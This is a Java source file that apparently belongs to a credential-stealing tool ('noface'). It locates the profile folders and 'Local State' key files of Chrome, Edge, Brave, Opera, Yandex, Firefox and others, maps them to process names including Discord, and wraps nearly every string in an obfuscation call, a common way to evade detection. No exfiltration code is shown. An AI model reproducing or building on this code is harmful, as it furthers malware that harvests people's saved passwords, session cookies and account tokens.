package noface.browsers;

import noface.config.S;

import java.nio.file.Files;
import java.nio.file.Path;

public final class Paths {

    public record Def(String name, Path userData, boolean chromium) {
        public Path localState() {
            return userData.resolve(S.e("Local State"));
        }

        public String proc() {
            if (name.equals(S.e("Chrome"))) return S.e("chrome");
            if (name.equals(S.e("Edge"))) return S.e("msedge");
            if (name.equals(S.e("Brave"))) return S.e("brave");
            if (name.equals(S.e("Vivaldi"))) return S.e("vivaldi");
            if (name.equals(S.e("Opera")) || name.equals(S.e("OperaGX"))) return S.e("opera");
            if (name.equals(S.e("Yandex"))) return S.e("browser");
            if (name.equals(S.e("Firefox"))) return S.e("firefox");
            return S.e("chrome");
        }
    }

    public static String procFor(Path source) {
        if (source == null) return null;
        String p = source.toAbsolutePath().toString().toLowerCase().replace('/', '\\');
        for (Def b : all()) {
            String marker = b.userData.toString().toLowerCase().replace('/', '\\');
            if (!marker.isEmpty() && p.contains(marker.replace(S.e("\\user data"), "").replace(S.e("\\profiles"), ""))) {
                return b.proc();
            }
        }
        if (p.contains(S.e("google\\chrome"))) return S.e("chrome");
        if (p.contains(S.e("microsoft\\edge"))) return S.e("msedge");
        if (p.contains(S.e("brave"))) return S.e("brave");
        if (p.contains(S.e("mozilla\\firefox"))) return S.e("firefox");
        if (p.contains(S.e("\\discord"))) return S.e("Discord");
        return null;
    }

    public static Def[] all() {
        String local = env(S.e("LOCALAPPDATA"));
        String appData = env(S.e("APPDATA"));
        return new Def[]{
                cr(S.e("Chrome"), Path.of(local, S.e("Google"), S.e("Chrome"), S.e("User Data"))),
                cr(S.e("Edge"), Path.of(local, S.e("Microsoft"), S.e("Edge"), S.e("User Data"))),
                cr(S.e("Brave"), Path.of(local, S.e("BraveSoftware"), S.e("Brave-Browser"), S.e("User Data"))),
                cr(S.e("Vivaldi"), Path.of(local, S.e("Vivaldi"), S.e("User Data"))),
                cr(S.e("Opera"), Path.of(appData, S.e("Opera Software"), S.e("Opera Stable"))),
                crOperaGx(appData, local),
                cr(S.e("Yandex"), Path.of(local, S.e("Yandex"), S.e("YandexBrowser"), S.e("User Data"))),
                cr(S.e("Chromium"), Path.of(local, S.e("Chromium"), S.e("User Data"))),
                new Def(S.e("Firefox"), Path.of(appData, S.e("Mozilla"), S.e("Firefox"), S.e("Profiles")), false),
        };
    }

    private static Def cr(String name, Path path) {
        return new Def(name, path, true);
    }

    private static Def crOperaGx(String appData, String local) {
        Path[] cands = {
                Path.of(appData, S.e("Opera Software"), S.e("Opera GX Stable")),
                Path.of(local, S.e("Opera Software"), S.e("Opera GX Stable")),
                Path.of(appData, S.e("Opera Software"), S.e("Opera GX")),
                Path.of(local, S.e("Programs"), S.e("Opera GX"))
        };
        for (Path p : cands) {
            if (Files.isRegularFile(p.resolve(S.e("Local State")))) return cr(S.e("OperaGX"), p);
        }
        for (Path p : cands) {
            if (Files.isDirectory(p)) return cr(S.e("OperaGX"), p);
        }
        return cr(S.e("OperaGX"), Path.of(appData, S.e("Opera Software"), S.e("Opera GX Stable")));
    }

    private static String env(String key) {
        String v = System.getenv(key);
        return v == null ? "" : v;
    }

    private Paths() {}
}
